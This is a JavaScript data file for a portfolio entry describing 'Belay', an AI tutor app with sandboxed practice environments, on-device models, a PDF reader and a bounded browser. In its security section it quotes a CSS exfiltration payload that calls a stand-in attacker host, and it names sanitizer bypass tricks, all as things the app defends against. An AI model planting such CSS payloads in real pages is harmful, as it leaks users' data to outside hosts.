// Auto-split from portfolioData.js (2026-06-10).
// Card fields (title, description, highlights, link labels) are the
// English source text; locale overrides live in src/i18n/locales/*.json
// under "projects.belay". Case-study (detailedContent) text is
// English by design for now.
const project = {
  "id": "belay",
  "title": "Belay — An AI Tutor That Reads Your Live State",
  "category": "web-app",
  "featured": true,
  "date": "2026-06-10",
  "sortOrder": -5,
  "media": {
    "type": "image",
    "src": "/Portfolio/belay/belay-hero.webp",
    "alt": "Belay's two-pane tutor workspace — the chat/tutor on the left, a live binary-search practice environment on the right, with graded Hint / One-step / Solution controls in the dark Anodized theme"
  },
  "description": "An interactive AI tutor that builds you a live, sandboxed practice space, reads your real progress from inside it over a structured state bridge, and hands you graded help that fades as you improve. Not a chatbot that writes HTML — it locates you in the task from live state before it says a word. One Vue 3 + TypeScript renderer ships as an Electron desktop app and a zero-install web build, runs hosted or fully on-device (transformers.js + ONNX Runtime), and opens onto an 80-template catalog across eight domains. It reads your papers too — box a formula in a PDF and pin the typeset answer to that exact spot — and a bounded in-app browser puts the real tool (ComfyUI, a fine-tuning studio on your own box) beside the tutor.",
  "detailedContent": {
    "overview": "Belay is an interactive learning environment. Instead of answering questions in a chat box, an LLM builds you a self-contained, interactive practice space, watches your real state inside it, figures out where you're stuck, and hands you graded help — a hint, then one concrete step, then the full solution — fading its support as you improve. The name comes from climbing: to belay is to hold the rope so a partner can push their limit without falling. You climb; the tutor holds the rope and catches you at exactly the right moment — with a nudge, not the answer.",
    "sections": [
      {
        "title": "The Real Differentiator — Structured Live State, Not Screenshots",
        "items": [
          "The thing that makes this more than \"a chatbot that writes HTML\" is that Belay reads structured, living state out of the running environment and locates the learner before it says a word",
          "Every generated environment maintains a snapshot on window.__learningState — planned steps, live inputs, attempts, lastError, completion — and answers a state request over an explicit postMessage bridge",
          "Because the environment is a sandboxed, opaque-origin iframe, this bridge is the only channel — and it carries facts, not pixels: \"step 2 is active, the Dockerfile has a FROM but no COPY, attempts = 3.\" Reasoning over structured facts is far more reliable than reading a rendered image",
          "A live state inspector lets you watch the same __learningState update in real time — useful for authoring environments and for understanding exactly what the tutor sees"
        ],
        "image": "/Portfolio/belay/belay-state.webp",
        "imageAlt": "Belay's live state inspector (⌘⇧S) open beside a running lesson: the window.__learningState snapshot — planned steps, currentInput, derived values, progress, attempts — is exactly the structured data the tutor reads over the bridge. Facts, not pixels."
      },
      {
        "title": "Graded Help That Fades",
        "items": [
          "Help is graded into three levels surfaced on the learning toolbar: Hint (a nudge toward the next idea, never the answer), One step (exactly one concrete next action), and Solution (the full answer, explained)",
          "Each request bundles the learner's live state with the chosen level, so the response is located: a hint for a half-written Dockerfile points at the specific missing instruction, not Docker in general",
          "Stuck on one spot? Point-and-annotate (⌘⇧A): drag a box over part of the environment and Belay attaches just that region to the chat, so you can ask \"what's wrong here?\" about an exact place — a crisp native capture on desktop, an in-frame capture on the web",
          "The design intent is fading — support recedes as competence, visible in the state, grows. Help is bindable to the keyboard, and the current level is part of the saved session",
          "Help can also arrive unprompted: opt-in proactive tutoring watches the live state for stall signals — no state change through an idle window, climbing attempts, a stuck lastError — and offers a nudge, capped per exercise so it never nags"
        ],
        "image": "/Portfolio/belay/belay-annotate.webp",
        "imageAlt": "Point-and-annotate in Belay: dragging a box over the environment opens a \"Comment on this area\" composer with the captured region attached, so a question lands on the exact spot the learner means."
      },
      {
        "title": "Read a Paper, Ask About a Formula — the PDF Reader & Visual Q&A",
        "items": [
          "The learning pane hosts documents, not just generated exercises: import a PDF and it becomes a host-rendered pdf.js reader built for the read-a-paper-and-ask loop — drag a box over a formula or figure and that page region goes to a vision model, with the answer landing in chat while the paper stays open",
          "The primitive choice that shaped it: for STEM content, text extraction destroys what matters — pdf.js's getTextContent() returns garbled glyphs for math, while a boxed objective function survives perfectly as pixels. So visual Q&A sends the rendered region to a vision-capable model, and image actions gate off with a hint when the active model can't see (an on-device model is never silently handed a screenshot it would drop)",
          "Lazy rendering is mandatory, not an optimization — measured before building: a retina A4 page canvas costs ~17 MB, so eager-rendering a 60-page paper would burn ~1 GB; a lazy window of live canvases keeps it ~52 MB flat regardless of length, with the first page on screen in <80 ms even for a scanned 32 MB file",
          "Untrusted bytes, contained: pdf.js runs as trusted bundled code in the host renderer — never the artifact sandbox, never the main process where a parser bug could reach Node/IPC — with isEvalSupported:false and page bitmaps only (no text/annotation/link layers, no PDF scripting), fed local content-addressed bytes (sha256-keyed on disk, IndexedDB on the web build), never a URL. Region capture crops the page canvas through a pure, tested css→backing-ratio mapping — DPR- and zoom-robust, identical on web and desktop, sidestepping Electron's platform-dependent capturePage coordinate spaces entirely",
          "The pane's content model became a discriminated union (html | pdf | pdf-missing | empty) so illegal states are unrepresentable: there is no 'html and pdf', missing bytes are an explicit recoverable state with a re-import action, and a consumer that forgets to branch gets a type error instead of a silent placeholder iframe",
          "Import goes beyond PDF — Markdown renders to a clean prose document and CSV/TSV becomes an interactive sortable table via a deterministic, model-free conversion through the same verify → render path — and attaching a PDF in the composer rasterizes its pages as vision input, so 'make me a quiz from this paper' generates an exercise grounded in the document",
          "When the tutor explains formulas it answers in LaTeX — so chat typesets it: KaTeX loads lazily as a separate ~260 KB chunk only when a message actually contains math, keeping the eager bundle unchanged"
        ],
        "video": "/Portfolio/belay/belay-research-papers.mp4",
        "videoPoster": "/Portfolio/belay/belay-research-papers-poster.jpg",
        "videoAlt": "Live recording: boxing a formula in a research paper, asking for a step-by-step breakdown, the request streaming off a self-hosted vLLM endpoint on a DGX Spark (speculative-decoding logs in the terminal), and the KaTeX-typeset explanation landing in chat with the paper still open.",
        "image": "/Portfolio/belay/belay-coma-assignment.webp",
        "imageAlt": "It reads my own coursework too: an assignment from my university mathematics studies (Computerorientierte Mathematik — summation and binomial coefficients, typeset from my original solutions) open in Belay's PDF reader, a region boxed over the formulas and the visual Q&A composer asking for a step-by-step proof of the hockey-stick identity. The same loop I use for ML papers, pointed at the math that started it."
      },
      {
        "title": "Pin the Answer to the Spot — a Persistent Annotation Layer",
        "items": [
          "A region-ask doesn't have to scroll away: 'Ask & pin' saves the answer as a durable marker on the page — numbered badges that re-open as draggable, resizable popovers with the explanation rendered as Markdown + KaTeX, positioned beside the selection so a note never covers the thing you boxed",
          "Durability comes from the storage primitive: a pin anchors by a normalized rect (x/y/w/h in 0..1 of the page), never screen pixels — it re-lands on the same words at any zoom, DPI, window size, or reload",
          "Non-blocking by construction: a pending marker appears immediately and resolves in the background — the pin owns the request, not the dialog — and a half-generated answer is never persisted (autosave keys on a revision counter, because a pin resolving changes content, not count)",
          "Snapshot pins extend annotation to every other filetype, honestly: a sandboxed artifact iframe is opaque-origin by design — the host cannot read element rects inside it, and its DOM reflows — so a live anchor is impossible there. The honest unit is a frozen region screenshot in a notes panel: it can't drift, and the tradeoff (it goes stale if you regenerate the artifact) is stated rather than hidden",
          "Because pins are portable data, export was assembly rather than a second system: a re-importable bundle (single JSON, or zipped through a lazily code-split ~11 KB fflate) restores every pin onto the same-hash PDF in a fresh session, and a self-contained study report renders each crop with its Q&A for sharing with someone who doesn't have Belay",
          "The 'New session is dead after a PDF' bug earned its own rule: a Vue reactive proxy can't be structured-cloned across Electron IPC — a nested proxy throws DataCloneError where a flat one happens to survive. Reproduced in a six-line test, fixed by snapshotting plain deep copies: anything that crosses IPC must be a plain object, never a framework's reactive wrapper"
        ],
        "image": "/Portfolio/belay/belay-pinned-explanations.webp",
        "imageAlt": "Pinned explanations on the ColBERT paper: numbered region markers over the late-interaction formula, with a popover re-rendering the step-by-step KaTeX explanation beside the selection — the same answer docked in the tutor chat on the left."
      },
      {
        "title": "Architecture — One Renderer, Two Targets",
        "items": [
          "A single Vue 3 + TypeScript renderer ships as both an Electron desktop app (built with electron-vite) and a zero-install web build — the same UI behind a small capabilities flag, so native capture / save / notifications light up on desktop and degrade cleanly on the web",
          "Sandboxed environments: each generated environment runs in an <iframe sandbox=\"allow-scripts\"> from srcdoc — an opaque origin with no network access, no host-DOM access, and no file access. The only channel to the host is the explicit postMessage state bridge",
          "Hardened Electron: contextIsolation on, nodeIntegration off, and a typed, minimal preload bridge — no raw Node in the UI. Deep-link slugs are validated against ^[a-z0-9-]+$ before any fetch to block path traversal",
          "A two-pane workspace (tutor chat ⇄ live environment) with a draggable, collapsible divider on desktop that collapses to a single tabbed pane on mobile, switching panes automatically as lessons and hints arrive",
          "On-device inference never runs in the Electron main process: native ML allocations there hit Chromium's allocator, which traps an over-large allocation and kills the whole app — so transformers.js + onnxruntime-node run in a dedicated utilityProcess (a plain Node child with the system allocator), where a real OOM is a catchable error and a crash is isolated and respawned (see the next section)"
        ]
      },
      {
        "title": "On-Device Models & the Inference Boundary",
        "items": [
          "A first on-device chat model didn't crash the model — it crashed the entire Electron app, and the headline here is the systems diagnosis: two identical macOS crash reports pointed at CrBrowserMain (the Electron main process) with the faulting stack inside ONNX Runtime — InferenceSession::Run → MatMul::Compute → BFCArena::Extend → operator new → trap",
          "The tell that this wasn't real OOM: it killed even the 0.5B model on a 36 GB machine while the web build never crashed — onnxruntime-web's WASM heap is fine, but onnxruntime-node's operator new in the main process is serviced by Chromium's PartitionAlloc malloc shim, which traps an over-large allocation as fatal; an allocator-policy abort, not exhausted RAM",
          "The fix followed from the stack and the web-vs-desktop asymmetry, not from capping the model or adding RAM: move inference into a dedicated utilityProcess with the system allocator over a narrow postMessage protocol (run / embed / preload / abort) — large native allocations behave normally, a genuine OOM becomes a catchable error and a UI message, a hard crash is isolated and the child respawned, and heavy inference never blocks the main thread",
          "transformers.js + onnxruntime-node power a fully on-device provider — no API key, nothing leaves the machine, downloaded on demand — flagged experimental on purpose: small local models are slower and weaker than a hosted provider, so on-device's lane is offline and privacy, and the remote providers stay the quality path",
          "The local catalog is curated by instruction-following (IFEval) plus chat-template coherence and decode speed, not the leaderboard Average — a benchmaxxed 1B can top the Average on reasoning while collapsing on IFEval, ignoring the strict lesson-structure prompt and breaking the required HTML, which is exactly the wrong tutor",
          "An Advanced: custom HF repo id seam keeps the catalog from ageing without opening a free-form trapdoor — it accepts a validated owner/name only (never a URL or path, re-checked host-side, which also closed a latent cache-path traversal) and probes the repo first (ONNX export present? which of q4/q4f16/q8? chat template?) before adding it best-effort",
          "The honest ceiling stays explicit: transformers.js needs ONNX exports well-maintained only to roughly 3–4B, the highest-leverage lever for usable speed is the execution provider rather than raw model size, and for tutor-grade quality remote beats on-device — naming which lever actually matters instead of chasing the biggest number"
        ],
        "image": "/Portfolio/belay/belay-ondevice.webp",
        "imageAlt": "Belay's on-device model catalog: ONNX embedders (all-MiniLM, bge-small) and chat models (Qwen2.5-0.5B, Llama-3.2-1B …) downloaded on demand and flagged experimental — slower and lower-quality than a hosted provider — plus the validated 'custom HF repo id' seam. The chat inference runs in a dedicated utilityProcess, not the app's main process."
      },
      {
        "title": "Verify → Self-Repair — and a Reviewer That Generalizes",
        "items": [
          "Generated code can be wrong, so nothing is shown until it is verified — in escalating tiers: structural (does it define the state hook and bridge, and parse?), loads (does it render in the sandbox without throwing?), state (does the bridge answer with the expected shape?), and self-test (if the environment defines window.__belaySelfTest(), run it and require a pass)",
          "On a failure, Belay feeds the specific error back to the model and asks it to repair the environment, then re-verifies — a self-healing loop that turns a broken first draft into a working one without bothering the learner",
          "An optional second, independently-configured reviewer model judges pedagogy on top of the structural verifier — so you can generate with a fast local model and review with a stronger hosted one, either async or blocking",
          "The reviewer generalized to chat replies and pinned answers (three independently-toggleable scopes) — but verify deliberately did not: verification executes an exercise's self-test and auto-repairs it, while prose has no checker, and a fake parses/non-empty gate would imply a guarantee it can't make. Splitting executable verification from model judgment is the design",
          "The prose rubric is conservative and the path fail-open: flag only confident factual errors, never Socratic hints or deliberately partial nudges; a reviewer outage shows no flag, so it can never make a correct answer look wrong; verdicts are staleness-guarded (edited messages, deleted pins, a session-generation guard against same-id collisions); and the low-signal case — reviewer model == generator model — is skipped",
          "Shipped under a real constraint: the desktop app couldn't be smoke-tested in the build environment, so an adversarial multi-agent review — finder agents per dimension, every finding then attacked by a second agent defaulting to 'not real' — substituted for the QA pass, surfacing five genuine defects (including a vision-gate bypass on artifact region-select) that all shipped fixed with their severities intact"
        ]
      },
      {
        "title": "What I Own vs. What I Delegate to the Model",
        "items": [
          "Belay was built with AI assistance — and the design is deliberately a small, owned core with the rest delegated to the model, which is exactly what separates it from \"clicked an app together with AI\"",
          "Owned (the real intellectual work): the state-hook convention and the prompt that makes a model honour it; the verortung — locating the learner from live state; the graded-help and fading logic; the verify → repair pipeline; the bridge and protocol",
          "Delegated to the model: the content of each environment — the actual exercise, its UI, and its checking logic — generated fresh per goal",
          "That boundary is the point: a small core I evolve by hand, and an open-ended surface the model fills — designed as a deliberate architectural decision, not a limitation",
          "Owned too: the trust boundaries around untrusted bytes — generated artifacts and learner text are treated as hostile. A css-tree AST sanitizer fail-closed on free artifact CSS (strips @import/@font-face, drops content and animation*, rejects any url() that isn't an inline data: URI, killing background:url(\"https://attacker/?leak=…\") exfiltration), a token-allowlist validator for same-origin host chrome (hex/rgb/hsl only, radii px 0–64, var()/url()/calc() rejected), a prompt-injection fence wrapping any artifact or learner text that reaches a model, and a main-process-authoritative Safe Mode whose async settings load is the boot guard — so bad CSS can never brick its own escape hatch",
          "Owned too are the systems boundaries that keep the app honest and alive: the process isolation that survives a model crash, and the rule that the in-lesson model informs but never adjudicates — the live-model bridge is injected into the visible frame only, never the off-screen verify frame, so a graded check stays deterministic and a live model never grades a learner",
          "An evasion-aware red-team pass closed three real bypass classes — CSS-escape evasion (a url() smuggled behind unicode escapes) decoded before matching, var()-fallback / custom-property smuggling caught by a string backstop, and namespaced selectors stripped — each pinned as a regression test (an 11-case suite) so a refactor can't quietly reopen the hole"
        ]
      },
      {
        "title": "The Interactive AI/ML Lab Library",
        "items": [
          "Beyond the starter exercises, Belay integrates flagship AI/ML \"labs\"",
          "A reusable adapter strips external dependencies, injects the uniform state bridge, and adds a tailored reader so each lab exposes meaningful live state (the gradient-descent lab surfaces optimizer, learning rate, and whether it is diverging)",
          "Exploratory labs opt out of strict self-testing via window.__belayNoCheck — there is no single \"correct\" state when the point is to build intuition"
        ]
      },
      {
        "title": "A Bounded Browser Beside the Tutor",
        "items": [
          "The labs teach the mechanism; the browse pane drives the real tool: a native WebContentsView opens ComfyUI, Open WebUI, or an Unsloth fine-tuning studio next to the chat, and the tutor reads the live page (extracted in an isolated world, fenced as untrusted data) and explains what's on screen — region-select works on the page too, freeze → box → compose, gated to vision models with an explicit disclosure",
          "Scoped as a companion, not a browser: the primary mode loads local and private tools only, pinned to the exact origin you opened. 'Is this host local?' is a question about addresses, not strings — a DNS name is admitted only if every resolved IP is private, so a DGX reachable over Tailscale (CGNAT 100.64.0.0/10) loads while a public name can never ride the companion path",
          "A spike found Electron's local-network-access controls don't actually enforce at the layer the plan assumed — so the boundary is built, not hoped for: opt-in remote browsing tunnels through a filtering proxy that validates the resolved IPs and then dials the validated literal IP, closing DNS rebinding (a name that passed the check can't re-resolve to 127.0.0.1 for the socket). HTTPS-only, fail-closed, pinned by unit tests",
          "One chat, two threads: web turns reuse the chat UI but live in a dedicated web-content thread that is never merged into the tutor thread, never persisted, and never embedded — untrusted page text architecturally cannot steer the trusted tutor context or leak into saved sessions",
          "Navigating to an arXiv .pdf doesn't fight Chromium's privileged PDF viewer (fundamentally incompatible with a sandboxed custom session): the bytes are intercepted at the headers layer, content-addressed, and handed to Belay's own reader — 'open a paper' and 'study a paper' become the same gesture, turning a rendering dead-end into a feature",
          "Hardened past the findings: an adversarially-flagged WebRTC IP leak was judged not exploitable in this setup — and closed anyway (disable_non_proxied_udp), because the fix cost one line and the downside of being wrong was a privacy leak"
        ],
        "image": "/Portfolio/belay/belay-browse-unsloth.webp",
        "imageAlt": "The localhost companion driving an Unsloth fine-tuning studio on a DGX Spark over Tailscale: QLoRA 4-bit run configuration on the right, and the tutor explaining a boxed region of the live page in its isolated web thread on the left."
      },
      {
        "title": "From 3 to 80 — The Catalog & Faceted Marketplace",
        "items": [
          "The owned core is a contract — window.__learningState, the postMessage bridge, the --belay-* design tokens, and the __belaySelfTest hook — so scaling content meant externalizing that exact seam into a reusable authoring kit, not enlarging the generation prompt",
          "A hand-authored template is indistinguishable from a generated one because both satisfy the same contract: the kit reproduces the verbatim bridge listener, token-with-fallback styling, and the self-test for a session that has none of Belay's injected context",
          "Content scaled 3 → 80 templates across eight domains — AI/ML, Frontend with a dedicated Vue track, Backend, .NET & C#, ERP & Business Central, DevOps, CS Fundamentals, and Spanish under a new Languages domain — with zero edits to tutor/prompts.ts, the build-vs-delegate line holding under load",
          "The flat single-tag grid became a faceted Domain → Topic marketplace — collapsible sidebar with live counts, full-text search, a difficulty facet, and sort — all URL-synced so any filtered view is shareable and back-button-safe",
          "A single taxonomy registry feeds both the Zod schema's domain enum and the marketplace sidebar, so the validation rules and the UI can't drift — a structure designed at ~11 templates so it absorbed 80 cleanly",
          "An official-publisher model splits the surfaces: /templates is the verified-publisher showcase grouped by domain, /marketplace is the faceted, rated, reviewed network — seeded for community submissions while the catalog is still all first-party",
          "Diagnosing the deploy topology fixed a real defect — a marketing /demo page shadowed the real web app served at the same slug, so the durable fix renamed the marketing tour to /demo-tour rather than leaving a collision a rebuild could reintroduce",
          "Every template is one click from running: the web build reads ?template=<slug> deep links (validated against ^[a-z0-9-]+$ before any fetch), loads the artifact through the normal verify → reveal path, and seeds it as a named lesson in a fresh session — so each marketplace card is an 'Open in Belay' link, never a stranded blank"
        ],
        "image": "/Portfolio/belay/belay-marketplace.webp",
        "imageAlt": "The faceted Belay marketplace: a Domain → Topic sidebar across eight domains with live counts, a difficulty facet, and search over one card grid — every artifact one click from opening in the app."
      },
      {
        "title": "Bring Your Own Model — Hosted or On-Device",
        "items": [
          "Three providers: any OpenAI-compatible or Anthropic endpoint — hosted or a local server (llama.cpp, LM Studio, Ollama, vLLM) on your own network — or a fully on-device provider that runs a local ONNX chat model via transformers.js with no key and nothing leaving the machine, flagged experimental since small-to-mid local models are slower and weaker than a hosted one and the quality path stays the remote providers",
          "Painless BYOK: keys encrypted at rest via the OS keychain (Electron safeStorage, with transparent migration off plaintext), a provider-specific Get-a-key deep link, and a live Connected — N models validation via a /models lookup so you pick from a dropdown instead of guessing",
          "No telemetry and no built-in backend — your prompts and live state go only to the endpoint you configure",
          "A curated, extensible on-device catalog — embedders like all-MiniLM / bge-small and chat models from Qwen2.5-0.5B up to SmolLM2-1.7B, downloaded on demand, plus an Advanced custom HF repo id seam — detailed in the On-Device Models section above",
          "Every workspace is a saved session — browse, switch, pin, and restore the full chat plus environment; Belay reopens your last one on launch",
          "A real settings surface behind it all: six themes (three dark, three light), four UI fonts and four text sizes; fully rebindable keyboard shortcuts with conflict detection; a custom generation prompt; and an optional, separately-configured reviewer model",
          "With no endpoint configured it still runs a friendly zero-config demo: recorded lessons stream word-by-word through the real verify→reveal path, and graded help works offline via a state-aware help(level, state) per lesson — so the public web demo feels like the real product on first contact"
        ],
        "image": "/Portfolio/belay/belay-settings.webp",
        "imageAlt": "Belay's settings and workspace: theme / font / size appearance, the bring-your-own-model provider config (OpenAI, Anthropic, or on-device), fully rebindable keyboard shortcuts, and the saved-session history with pin and restore."
      }
    ]
  },
  "highlights": [
    "Reads structured live state over a sandboxed postMessage bridge — reasons about facts, not pixels",
    "Graded help (Hint → One step → Solution) located from live state, with support that fades as you improve",
    "Verify → self-repair pipeline: a broken first draft is fed its own failure and regenerated until it passes",
    "Runs hosted or fully on-device (transformers.js + ONNX Runtime), with native inference isolated in its own process so a model crash can't take the app down",
    "Host-rendered PDF reader with region visual Q&A — pin typeset answers to the exact spot, export and re-import them",
    "Bounded in-app browser for your local AI tools — a self-built filtering proxy closes DNS rebinding, and untrusted page text never enters persisted context"
  ],
  "technologies": [
    "Vue 3",
    "TypeScript",
    "Electron",
    "electron-vite",
    "Vite",
    "Astro",
    "transformers.js",
    "ONNX Runtime",
    "pdf.js",
    "KaTeX",
    "Zod",
    "OpenAI API",
    "Anthropic API"
  ],
  "mainTech": "vue",
  "links": [
    {
      "type": "live",
      "url": "https://www.cdtio.com/belay/demo/",
      "label": "Try the live demo"
    },
    {
      "type": "live",
      "url": "https://www.cdtio.com/belay/",
      "label": "Visit the Belay site"
    }
  ],
  "tags": [
    "ai-ml",
    "llm",
    "ai",
    "vue",
    "typescript",
    "electron",
    "education",
    "agents",
    "sandbox",
    "tutor",
    "interactive",
    "on-device",
    "transformers.js",
    "marketplace",
    "pdf",
    "annotations",
    "security"
  ]
};

export default project;
